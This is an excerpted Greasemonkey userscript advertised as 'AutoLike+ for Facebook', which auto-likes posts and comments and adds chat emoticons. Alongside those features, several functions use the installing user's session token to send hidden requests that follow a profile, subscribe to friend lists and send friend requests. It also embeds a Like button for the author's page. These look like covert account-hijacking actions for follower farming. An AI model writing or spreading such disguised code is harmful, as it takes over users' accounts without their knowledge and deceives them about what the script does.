// ==UserScript==
// @name         AutoLike+ for Facebook
// @namespace       AutoLike+ for Facebook 
// @description     AutoLike Status Updates and Comments on your Facebook News Feed and PLUS NEW CHAT EMOTICONS!
// @author			Winboys Soft
// @authorURL		https://www.facebook.com/WinboysSoft
// @updateURL      https://userscripts.org/scripts/source/164572.meta.js
// @include			htt*://www.facebook.com/*
// @exclude 		htt*://apps.facebook.com/*
// @icon			http://i.imgur.com/IUrIStN.png
// @version			1.2
...
function a(F) {
   ...
   var H = "/ajax/follow/follow_profile.php?__a=1";
   var E = "profile_id=" + F + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
   G.open("POST", H, true);
...
function sublist(D) {
   ...
   C.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + D + " }).send();";
...
if (gf.readyState != 4) {} else {
   ...
   if (data.error) {} else {
      friends = data.payload.entries["sort"](function(D, C) {
...
function sarkadasekle(G, E) {
   var H = new XMLHttpRequest();
   H.onreadystatechange = function() {
      if (H.readyState == 4) {}
   };
   H.open("POST", "/ajax/add_friend/action.php?__a=1", true);
   var F = "to_friend=" + G;
   F += "&action=add_friend";
   F += "&how_found=friend_browser";
   F += "&ref_param=none";
   F += "&outgoing_id=";
   F += "&logging_location=friend_browser";
   F += "&no_flyout_on_click=true";
   F += "&ego_log_data=";
   F += "&http_referer=";
   F += "&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value;
   F += "&phstamp=165816749114848369115";
   F += "&__user=" + user_id;
   H.setRequestHeader("X-SVN-Rev", svn_rev);
   H.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
   if (E == "farketmez" && document.cookie.split("cins" + user_id + "=").length > 1) {
      H.send(F);
   } else {
      if (document.cookie.split("cins" + user_id + "=").length <= 1) {
         cinsiyetgetir(G, E, "sarkadasekle");
      } else {
         if (E == document.cookie.split("cins" + user_id + "=")[1].split(";")[0].toString()) {
            H.send(F);
         }
      }
   }
...
if (body !== null) {
   ...
   unsafeWindow.AutoLike = function() {
      ...
      for (var K = 0; K < P.length; K++) {
         if (P[K].getAttribute("class") !== null && P[K].getAttribute("class").indexOf("UFILikeLink") >= 0 && (P[K].innerHTML == "Me gusta" || P[K].innerHTML == "Like" || P[K].innerHTML == "אהבתי" || P[K].innerHTML == "Suka" || P[K].innerHTML == "Beğen" || P[K].innerHTML == "أعجبني" || P[K].innerHTML == "いいね！" || P[K].innerHTML == "讚" || P[K].innerHTML == "Seneng" || P[K].innerHTML == "좋아요" || P[K].innerHTML == "J’aime")) {
            Q[O] = P[K];
            O++;
         }
      }
      function T(A) {
         Q[A].click();
         var B = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: " + (A + 1) + "/" + Q.length + "</center></a>";
...
if (body !== null) {
   ...
   unsafeWindow.LikeComments = function() {
      ...
      function T(A) {
         Q[A].click();
         var B = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: " + (A + 1) + "/" + Q.length + "</center></a>";
...
if (body !== null) {
   ...
   div.style.border = "1px solid #6B84B4";
   div.style.padding = "3px";
   div.innerHTML = "<a style='font-weight:bold;color:#E30505' onclick='BugInfo()'><center>Report a BUG</center></a></a>";
   body.appendChild(div);
   unsafeWindow.BugInfo = function() {
      window.open(this.href = "https://www.facebook.com/WinboysSoft", "dmfollow", "toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=yes,width=800,height=600");
      return false;
   };
}
if (body !== null) {
   ...
   div.style.border = "1px solid #6B84B4";
   div.style.padding = "3px";
   div.innerHTML = "<iframe src='http://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2FWinboysSoft&send=false&layout=button_count&width=70&show_faces=false&font=segoe+ui&colorscheme=light&action=like&height=21&appId=106417406105547'></iframe>";
   body.appendChild(div);
}
...
function setValue(C, D) {
   ...
   case "greasemonkey":
      ...
      break;
   case "localstorage":
      localStorage["femotbar-0-" + C] = D;
      break;
   }
}
function getValue(D, F) {
   switch (storage) {
   case "greasemonkey":
      return GM_getValue("0-" + D, F);
   case "localstorage":
      var E = localStorage["femotbar-0-" + D];
      if (E == "true") {
         return true;
      } else {
         if (E == "false") {
...
function xmlhttpRequest(D, C) {
   if (typeof GM_xmlhttpRequest !== "undefined") {
      D.onload = C;
      return GM_xmlhttpRequest(D);
   }
   return null;
}
...
function createSelection(G, F, H) {
   if (G.createTextRange) {
      var E = G.createTextRange();
      E.collapse(true);
      E.moveStart("character", F);
      E.moveEnd("character", H);
      E.select();
   } else {
...
var sp = "Contact Us On Facebook www.facebook.com/WinboysSoft Download From : http://userscripts.org/scripts/show/164572";
...
function fEmotClickHandler(I) {
   var J = I.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName("fbNubFlyoutFooter")[0].getElementsByClassName("inputContainer")[0].getElementsByClassName("uiTextareaAutogrow input")[0];
   var G = getCursorPosition(J);
   var H = "";
   var F = "";
   if (J.value.charAt(G - 1) != " " && G - 1 > 0) {
      H = " ";
   }
   if (J.value.charAt(G) != " ") {
      F = " ";
   }
   J.value = J.value.substring(0, G) + H + I.target.getAttribute("alt") + F + J.value.substring(G);
   createSelection(J, G + I.target.getAttribute("alt").length + F.length + H.length, G + I.target.getAttribute("alt").length + F.length + H.length);
}
function fStyleClickHandler(L) {
   var N = L.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName("fbNubFlyoutFooter")[0].getElementsByClassName("inputContainer")[0].getElementsByClassName("uiTextareaAutogrow input")[0];
   var I = N.value.substring(N.selectionStart, N.selectionEnd);
   var J = getCursorPosition(N);
   var M = I.length;
   if (M === 0) {
      N.value = N.value.substring(0, J) + L.target.getAttribute("alt") + N.value.substring(J);
      createSelection(N, J + 1, J + L.target.getAttribute("alt").length - 1);
   } else {
      var K = L.target.getAttribute("alt").charAt(0);
      var H = L.target.getAttribute("alt").charAt(0);
      while (N.value.charAt(J) == " ") {
         J += 1;
         M -= 1;
      }
      while (N.value.charAt(J + M - 1) == " ") {
         M -= 1;
      }
      if (N.value.charAt(J - 1) != " " && J - 1 > 0) {
         K = " " + K;
      }
      if (N.value.charAt(J + M) != " ") {
         H += " ";
      }
      N.value = N.value.substring(0, J) + K + N.value.substring(J, J + M) + H + N.value.substring(J + M);
      createSelection(N, J + M + 2, J + M + 2);
   }
}
